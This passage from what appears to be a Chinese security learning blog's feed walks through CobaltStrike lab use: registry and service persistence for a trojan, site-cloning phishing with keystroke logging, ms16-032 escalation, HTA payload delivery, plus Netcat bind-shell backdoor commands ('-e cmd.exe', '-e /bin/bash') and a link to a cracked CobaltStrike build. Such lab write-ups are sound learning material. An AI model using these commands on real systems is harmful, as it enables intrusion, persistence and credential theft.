<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">设置服务的描述字符串</span><br><span class="line">shell sc description <span class="string">&quot;server power&quot;</span> <span class="string">&quot;description&quot;</span></span><br><span class="line"></span><br><span class="line">设置服务为自启动</span><br><span class="line">shell sc<span class="built_in"> config </span><span class="string">&quot;server power&quot;</span> start= auto</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg3.png"></p>
<p>然后启动服务<br>shell net start “server power”</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg4.png"></p>
<h2 id="也可以直接向注册表写开机启动项"><a href="#也可以直接向注册表写开机启动项" class="headerlink" title="也可以直接向注册表写开机启动项"></a>也可以直接向注册表写开机启动项</h2><p>还是用上一步生成的木马程序</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">shell reg add HKLM<span class="tag">\<span class="name">SOFTWARE</span></span><span class="tag">\<span class="name">Microsoft</span></span><span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">CurrentVersion</span></span><span class="tag">\<span class="name">Run</span></span> /v &quot;keyname&quot; /t REG_SZ /d &quot;C:<span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">artifact</span></span>.exe&quot; /f</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg5.png"></p>
<p>切换到靶机，打开注册表<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg6.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg7.png"></p>
<p>靶机重启之后，在cs同样是自动拿到了控制权限</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike学习六</title>
    <url>/2019/10/18/CobaltStrike%E5%AD%A6%E4%B9%A0%E5%85%AD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>使用cs进行钓鱼攻击。</p>
<a id="more"></a>

<hr>
<h2 id="cs获取靶机权限"><a href="#cs获取靶机权限" class="headerlink" title="cs获取靶机权限"></a>cs获取靶机权限</h2><p>从下图开始<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-18%2006-57-50%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<ul>
<li>进入beacon console</li>
<li>设置心跳时间0<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-18%2007-01-20%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></li>
</ul>
<h2 id="克隆我们的网站"><a href="#克隆我们的网站" class="headerlink" title="克隆我们的网站"></a>克隆我们的网站</h2><ul>
<li>Attacks-&gt;web driver by -&gt;clone site</li>
<li>重点要勾选键盘记录(红色框框，不然web_log里看不到)<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-18%2009-48-40%20%E7%9A%84%E5%9B%BE.png"></li>
</ul>
<p>clone之后，在win7机上打开<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/123456.png"></p>
<ul>
<li>如果受害者输入了用户名123，密码test123</li>
<li>我们可以在view中查看Web Log<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-18%2009-42-49%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></li>
</ul>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike学习四</title>
    <url>/2019/10/16/CobaltStrike%E5%AD%A6%E4%B9%A0%E5%9B%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>CobaltStrike之提权及spawn</p>
<a id="more"></a>

<hr>
<h1 id="1-提权"><a href="#1-提权" class="headerlink" title="1 提权"></a>1 提权</h1><h2 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/ededw.png"></p>
<h2 id="1-1-elevate-kit提权"><a href="#1-1-elevate-kit提权" class="headerlink" title="1.1 elevate-kit提权"></a>1.1 elevate-kit提权</h2><p>查看cs自带的漏洞库<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/1E5%5DVNJGT%40U42I%40OW1.png"></p>
<h3 id="1-2-导入cna文件"><a href="#1-2-导入cna文件" class="headerlink" title="1.2 导入cna文件"></a>1.2 导入cna文件</h3><p>丰富我们的漏洞库</p>
<ul>
<li>点击左上角cobalt strike-&gt;script manager</li>
<li>点击load，找到下载的ElevateKit工具路径，选择cna文件<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/ewewe.png"></li>
</ul>
<p>选中elevate.cna点击‘打开’<br>然后回到beacon shell，再次输入elevate<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/FOKI%24%257%25P5KSFG4GX%60G8.png"></p>
<h2 id="1-3-选择exp进行提权"><a href="#1-3-选择exp进行提权" class="headerlink" title="1.3 选择exp进行提权"></a>1.3 选择exp进行提权</h2><p>右键-&gt;access-&gt;elevate<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/222222223.png"></p>
<h3 id="1-4-使用ms16-032成功-获得管理员权限"><a href="#1-4-使用ms16-032成功-获得管理员权限" class="headerlink" title="1.4 使用ms16-032成功,获得管理员权限"></a>1.4 使用ms16-032成功,获得管理员权限</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/3MOEK3QYDM%7BR%7D6ZAH.png"></p>
<h1 id="2-Spawn"><a href="#2-Spawn" class="headerlink" title="2.Spawn"></a>2.Spawn</h1><h2 id="什么是spawn"><a href="#什么是spawn" class="headerlink" title="什么是spawn"></a>什么是spawn</h2><blockquote>
<p> 简单理解,所谓的<code>派生</code>,即仅仅通过一个beacon shell就可以再孵化出n个shell,shell与<br>shell之间相当于以一种级联的形式存在的</p>
</blockquote>
<p>这样一种场景：<br>假如你同事跟你说，他需要你那个目标的shell，但又不想直接连到你的团队服务器上。事实上，这个场景非常常见，cs针对这种场景的解决办法就是：让他直接在他本地起一个团队服务器创建个监听器，然后你再用你的cobaltstrike客户端连到他的团队服务器上，最后，把他要那个目标的shell派生到他指定的那个监听器上即可。</p>
<h2 id="2-1切换另一台kali，启动teamserver"><a href="#2-1切换另一台kali，启动teamserver" class="headerlink" title="2.1切换另一台kali，启动teamserver"></a>2.1切换另一台kali，启动teamserver</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/GJML%24%60Z%7BUPIJ9_58USSL.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/MD%60Z2%5B%24CNB%24Z6D0.png"></p>
<p>然后在这台kali上启动一个客户端<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/8WNL9Q5%5B%5DWTD0LH_G%5B1RN.png"></p>
<p>可以看到此时是没有beacon<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/F09J%40O_D98LNC%251XLVQ1.png"></p>
<p>创建一个listener</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/R%5BTRJ8%7E0%7D1FKO%24%25%7ETI.png"></p>
<h2 id="2-2切换到第一台kali"><a href="#2-2切换到第一台kali" class="headerlink" title="2.2切换到第一台kali"></a>2.2切换到第一台kali</h2><p>在上一台已经拿到beacon的客户端上，创建新的连接，连接到.150这台kali启动的teamserver上<br>点击左上角，cobalt strike-&gt;new connection<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/SZB%25%7EPU74%5D3M40VHZHK9_MB.png"></p>
<p>Host填.150那台kali，点击connect</p>
<p>此时在左下角我们可以看到，在客户端这儿是可以切换两台teamserver的<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/W5SUY%6051Z%7DVKRX%25NIZQS.png"></p>
<p>我们切换到<a href="mailto:&#x6e;&#x65;&#x6f;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;">&#x6e;&#x65;&#x6f;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;</a><br>选中一个beacon，右键spawn<br>然后选中在.150的cs客户端上创建的listener<br>点击choose即可</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/KI%60VA%7DI%24LCC1FTL3IW.png"></p>
<h2 id="2-3切换-150的cs客户端"><a href="#2-3切换-150的cs客户端" class="headerlink" title="2.3切换.150的cs客户端"></a>2.3切换.150的cs客户端</h2><p>可以看到此时已经收到.100的cs客户端spawn来的beacon了</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/AC8XWBKOSYDDB.png"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike学习一</title>
    <url>/2019/10/08/CobaltStrike%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>一次完整的渗透试验，熟悉cs的基本使用</p>
<a id="more"></a>
<blockquote>
<p>启动服务端-》在客户端连接服务端-》创建listener-》创建攻击载荷-》投递载荷-》靶机下载执行-》靶机上线-》拿到shell-》生成渗透测试报告。</p>
</blockquote>
<hr>
<h3 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h3><p>我是建在阿里云的vps上，搭建cobaltstrike里有介绍</p>
<h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><p>同样在搭建的文章里介绍了</p>
<h3 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h3><ul>
<li>左上角Cobaltstrike–&gt; listeners</li>
<li>右下角菜单栏有add，添加新listener</li>
<li>Host为kali本机的ip</li>
</ul>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2004-41-53%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<p>name随意，payload主要分为beacon和foreign两大类</p>
<pre><code>  Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、SMB。

  Foreign为外部结合的Listener，常用于MSF的结合</code></pre>
<p>save生成，并点击确定</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2004-53-44%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<p>此时，listener出现一条记录</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2004-56-34%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<h3 id="创建攻击载荷"><a href="#创建攻击载荷" class="headerlink" title="创建攻击载荷"></a>创建攻击载荷</h3><ul>
<li>攻击途径 Attacks–&gt;HTML Application</li>
<li>选择攻击方法 PowerShell<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2005-01-12%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></li>
</ul>
<p>点击generate生成，文件路径和文件名随意<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2005-03-58%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<h3 id="投递载荷"><a href="#投递载荷" class="headerlink" title="投递载荷"></a>投递载荷</h3><ul>
<li>Attacks–&gt;Web Drive-by–&gt;Host File</li>
</ul>
<p>file选择前面生成的hta的文件路径</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2005-09-15%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<p>点击launch生成链接</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2005-11-39%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<h3 id="靶机下载执行"><a href="#靶机下载执行" class="headerlink" title="靶机下载执行"></a>靶机下载执行</h3><p>win7 sp1，cmd,执行mshta命令，mshta使用来执行.HTA文件</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/JL3PN8BHRKHGIH%7DYS9HR0US.png" alt="avatar"></p>
<h3 id="靶机上线"><a href="#靶机上线" class="headerlink" title="靶机上线"></a>靶机上线</h3><p>在kali中可以看到肉鸡上线，event log中有相关日志</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-09%2005-18-33%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike安装</title>
    <url>/2019/10/07/CobaltStrike%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Cobalt Strike 一款以 metasploit 为基础的 GUI 的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。</p>
<a id="more"></a>

<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>下载 Cobalt Strike 3.14破解版本</p>
<blockquote>
<p><a href="https://pan.baidu.com/s/1KaZtM7F8sV21Zd1q5upkMw">https://pan.baidu.com/s/1KaZtM7F8sV21Zd1q5upkMw</a> 密码：2oij </p>
</blockquote>
<p>申请适用版会很麻烦，就直接贴出来</p>
<h4 id="服务器端安装与运行"><a href="#服务器端安装与运行" class="headerlink" title="服务器端安装与运行"></a>服务器端安装与运行</h4><p>Cobalt Strike3.0 需要开启团体服务器才可以链接使用，当然，这个服务器可以放到公网环 境下，或者放到自己想要搭建此服务的环境中。</p>
<p>在使用 Cobalt Strike 之前，需要安装 java 环境，具体怎么配置，请移步 <a href="https://www.cnblogs.com/chuijingjing/p/10316310.html">java 环境搭建</a></p>
<p>将Cobalt Strike上传到vps上，解压<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/cobaltstrike1.png" alt="avatar"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">运行服务端：./teamserver <span class="number">139.196</span><span class="number">.87</span><span class="number">.221</span> password        服务器IP 和 客户端连接密码</span><br><span class="line"></span><br><span class="line">运行服务端：nohup ./teamserver <span class="number">139.196</span><span class="number">.87</span><span class="number">.221</span> password &amp;         放入后台运行</span><br></pre></td></tr></table></figure>
<p><a href="https://www.3hack.com/note/96.html">修改Cobalt Strike的默认端口</a></p>
<h4 id="客户端运行"><a href="#客户端运行" class="headerlink" title="客户端运行"></a>客户端运行</h4><p>服务运行以后，在客户端进行连接：</p>
<blockquote>
<p> ./cobaltstrike</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/cobaltstike2.png" alt="avatar"></p>
<p>这里 ip 使用服务器的 ip，端口修改为55555，用户名随意，密码为之前设置的密码，然后 connect, 弹出验证窗口，然后点是，就 进入 Cobalt Strike 了。</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/cobaltstike3.png" alt="avatar"></p>
<h4 id="谈谈安装时的坑"><a href="#谈谈安装时的坑" class="headerlink" title="谈谈安装时的坑"></a>谈谈安装时的坑</h4><p>首先 这个Cobalt Strike3以上版本真的很难找，你去官网下载现在还下载不了，网上绝大数分享也都已经失效</p>
<p>其次：在服务器端的java环境要换成Oracle jdk 1.8 版本,否则无法完成编译，客户端connect是也会出现超时的情况</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透测试———流程</title>
    <url>/2019/11/29/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E2%80%94%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>渗透测试：出于保护系统的目的，更全面地找出测试对象的安全隐患。</li>
<li>入侵：不择手段地（甚至是具有破坏性的）拿到系统权限。</li>
</ul>
<a id="more"></a>


<hr>
<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/X%25D%24A%5DOQ4%409RD0.png"></p>
<p>一般渗透测试过程 <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/v2-1efe3d139106d8755d376136120fbbb4_r.jpg" alt="一般渗透测试过程"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="1-域名、IP、端口"><a href="#1-域名、IP、端口" class="headerlink" title="1. 域名、IP、端口"></a>1. 域名、IP、端口</h3><h4 id="域名信息查询："><a href="#域名信息查询：" class="headerlink" title="域名信息查询："></a>域名信息查询：</h4><ul>
<li>收集注册人信息，域名DNS服务器信息，子域名查询</li>
</ul>
<p>1.1.1 Whois查询</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/X5M93TG2IOGPZB%2581H6%7B8Q3.png"></p>
<p>在线查询网站</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://whois.aizhan.com</span><br><span class="line">http://whois.chinaz.com</span><br><span class="line">https://www.virustotal.com</span><br></pre></td></tr></table></figure>
<p>1.1.2 空间搜索引擎SSL证书</p>
<p><a href="https://fofa.so/">fofa</a>查询子域名</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#搜索企业证书 北京京东上科信息科技有限公司</span></span><br><span class="line">cert=<span class="string">&quot;Organization：Beijing Jingdong Shangke Information Technology&quot;</span></span><br></pre></td></tr></table></figure>
<p>1.1.3 其他泄露信息</p>
<p>js，图片，css，title，copyright，网站跳转，crossdomain.xml 文件</p>
<p>1.1.4 子域名爆破 </p>
<p>子域名检测工具</p>
<p>Layer子域名挖掘机，Sublist3r subDomainsBrute</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-30%2021-33-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-30%2021-56-50%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<h4 id="IP信息查询："><a href="#IP信息查询：" class="headerlink" title="IP信息查询："></a>IP信息查询：</h4><ul>
<li>确认真实IP，绕过CDN</li>
</ul>
<p>1.2.1 判断是否使用CDN</p>
<p>进行全国异地ping，对比每个地区的IP结果</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/IRATI6A1%24K.png"></p>
<p>在线异地ping网站</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">https://www.17ce.com</span><br><span class="line">http://ping.chinaz.com/</span><br></pre></td></tr></table></figure>
<p>绕过CDN寻找真实IP</p>
<p>命令：nslookup -qt=A baidu.com </p>
<p>常规方法</p>
<ul>
<li><p>分站域名。CDN一般都存在在主站上，分站可能没有挂CDN，可以ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP，但在一个C端下。如果是架在云服务器上，那就不可行。</p>
</li>
<li><p>国外访问。国内的CDN往往只针对国内用户的访问加速，国外的用户就不一定了。<br>国外在线代理网站：<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%24ML%7DIZBQ9U%5BE.png"></p>
</li>
<li><p>查询域名解析记录 查询网站没用CDN之前的IP历史记录</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/83%404KDP%5D%245FCV.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/_V%7DQ60BSLR6MOWUAROE.png"></p>
<p>域名解析记录网站：</p>
  <figure class="highlight r"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn</span><br><span class="line">http://viewdns.info/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="端口信息查询："><a href="#端口信息查询：" class="headerlink" title="端口信息查询："></a>端口信息查询：</h4><ul>
<li>确认开放端口</li>
</ul>
<p>1.3.1 Nmap扫描</p>
<p><a href="https://blog.csdn.net/qqchaozai/article/details/102521557">Nmap基础教程</a></p>
<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>首页index.php,html,js,css中多少会包含特征码。例如WordPress在robots.txt中包含wp-admin。</p>
<p>在线CMS指纹查询：</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">BugScaner: http://whatweb.bugscaner.com/look</span><br><span class="line">云悉指纹：http://www.yunsee.cn/finger.html</span><br><span class="line">Whatweb：http://whatweb.net</span><br></pre></td></tr></table></figure>
<p>whatweb 使用</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-30%2022-25-06%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p>后台特征</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/1.png"></p>
<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><ul>
<li><p>主机扫描</p>
<ol>
<li>主机扫描 <a href="https://www.52pojie.cn/thread-898541-1-1.html">Nessus</a></li>
</ol>
</li>
</ul>
<pre><code> 查看有无CVE漏洞</code></pre>
<ul>
<li><p>Web扫描</p>
<ol>
<li><p>web扫描 AWVS</p>
<p><a href="https://www.cnblogs.com/LyShark/p/11401811.html">安装教程</a>   </p>
</li>
</ol>
</li>
<li><p>渗透测试</p>
<ol>
<li>BurpSuite： <a href="http://ximcx.cn/post-110.html">下载地址</a> Kali已经有2.0版本了</li>
</ol>
</li>
</ul>
<h2 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h2><p><a href="https://blog.csdn.net/qqchaozai/article/details/102802018">逻辑漏洞</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Netcat</title>
    <url>/2019/03/27/Netcat/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀</p>
<a id="more"></a>

<hr>
<h1 id="1-netcat常用参数"><a href="#1-netcat常用参数" class="headerlink" title="1.netcat常用参数"></a>1.netcat常用参数</h1><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby"><span class="symbol">l:</span>设置netcat处于监听状态等待连接</span></span><br><span class="line"><span class="ruby">-L：设置netcat处于监听状态等待连接，当客户端断开，服务端依旧回到等待状态</span></span><br><span class="line"><span class="ruby">-p：本地监听端口号</span></span><br><span class="line"><span class="ruby">-v：显示端口信息，如果使用-vv的话，则显示更加详细的端口信息</span></span><br><span class="line"><span class="ruby">-e：执行某个程序，如cmd.exe</span></span><br><span class="line"><span class="ruby">-<span class="symbol">n:</span>只识别IP地址，不对目标进行DNS解析</span></span><br><span class="line"><span class="ruby">-u：使用UDP模式（nc默认使用tcp连接）</span></span><br><span class="line"><span class="ruby">-z：zero I/O模式，专用端口扫描。表示对目标IP发送的数据表中不包含payload，加快扫描速度</span></span><br><span class="line"><span class="ruby">-<span class="symbol">w1:</span>超时设置<span class="number">1</span>秒</span></span><br><span class="line"><span class="ruby">-<span class="symbol">d:</span>脱离命令窗口，在后台运行，常用于后门的建立过程</span></span><br><span class="line"><span class="ruby">-<span class="symbol">G:</span>gateway 设置网关，用于内网突破限制</span></span><br><span class="line"><span class="ruby">-g：num，路由调数</span></span><br><span class="line"><span class="ruby">-o <span class="symbol">:file</span>,设置传输<span class="number">16</span>进制的数据</span></span><br><span class="line"><span class="ruby">-<span class="symbol">s:</span>addr,设置netcat源地址，隐藏自己的ip地址</span></span><br><span class="line"><span class="ruby">-t：恢复telnet的请求数据包</span></span><br><span class="line"><span class="ruby">-r：设置netcat随机化的端口号</span></span><br></pre></td></tr></table></figure>

<h1 id="2-基础使用"><a href="#2-基础使用" class="headerlink" title="2.基础使用"></a>2.基础使用</h1><h2 id="2-1-简单通信"><a href="#2-1-简单通信" class="headerlink" title="2.1   简单通信"></a>2.1   简单通信</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">一般通信:</span><br><span class="line">创建服务端：nc -l -p <span class="number">4444</span></span><br><span class="line">创建客户端：nc <span class="number">192.168</span><span class="number">.59</span><span class="number">.138</span> <span class="number">4444</span></span><br><span class="line">此时并不能对服务端进行命令执行</span><br><span class="line"></span><br><span class="line">返回shell的通信：</span><br><span class="line">服务端：nc -l -p <span class="number">4444</span> -e cmd.exe</span><br><span class="line">客户器端可以对服务端执行cmd的命令</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/E32E2.jpg" alt="注：我是在同一台电脑里进行nc实验的，客户端的ip应填服务器的ip。"><br>注：我是在同一台电脑里进行nc实验的，客户端的ip应填服务器的ip。</p>
<h2 id="2-2-文件传输"><a href="#2-2-文件传输" class="headerlink" title="2.2     文件传输"></a>2.2     文件传输</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">创建服务端：nc -l -p <span class="number">4444</span> &gt; outfile</span><br><span class="line"> 服务端接受一个文件并重定向到 outfile</span><br><span class="line"></span><br><span class="line">创建客户端：nc <span class="number">192.168</span><span class="number">.59</span><span class="number">.138</span> <span class="number">4444</span> &lt; infile</span><br><span class="line"> 实现了客户端向服务器端传输文件</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/32323.png"></p>
<h1 id="3-内网探测"><a href="#3-内网探测" class="headerlink" title="3.内网探测"></a>3.内网探测</h1><h2 id="3-1-端口扫描"><a href="#3-1-端口扫描" class="headerlink" title="3.1   端口扫描"></a>3.1   端口扫描</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">获得目标的权限之后，目标没有途径可以去进行内网探测，此时可以用nc对内网ip和端口进行扫描</span><br><span class="line">-nc -v -n -z -w1 <span class="number">192.168</span><span class="number">.59</span><span class="number">.135</span> <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/21312312312.PNG"></p>
<h2 id="3-2-Banner抓取"><a href="#3-2-Banner抓取" class="headerlink" title="3.2   Banner抓取"></a>3.2   Banner抓取</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">-echo “ ” | -nc -v -n -z -w1 <span class="number">192.168</span><span class="number">.59</span><span class="number">.135</span> <span class="number">1</span><span class="number">-65535</span></span><br><span class="line">banner 信息来表示欢迎语，其中会包含一些敏感信息，所以获取 banner 也属于信息搜集的范畴。</span><br></pre></td></tr></table></figure>


<h1 id="4-建立后门"><a href="#4-建立后门" class="headerlink" title="4.建立后门"></a>4.建立后门</h1><blockquote>
<p>原理：netcat一切数据通过标准输入/输出流实现的，所以可以利用netcat的命令进行后门的简历，并传输结果信息。</p>
</blockquote>
<h2 id="4-1-对windows建立后门"><a href="#4-1-对windows建立后门" class="headerlink" title="4.1    对windows建立后门"></a>4.1    对windows建立后门</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">-nc -l -<span class="selector-tag">p</span> <span class="number">4444</span> -e cmd<span class="selector-class">.exe</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/21213123.PNG"></p>
<h2 id="4-2-对linux建立后门"><a href="#4-2-对linux建立后门" class="headerlink" title="4.2    对linux建立后门"></a>4.2    对linux建立后门</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">-nc -l -p <span class="number">4444</span> -e <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/434343f.png"></p>
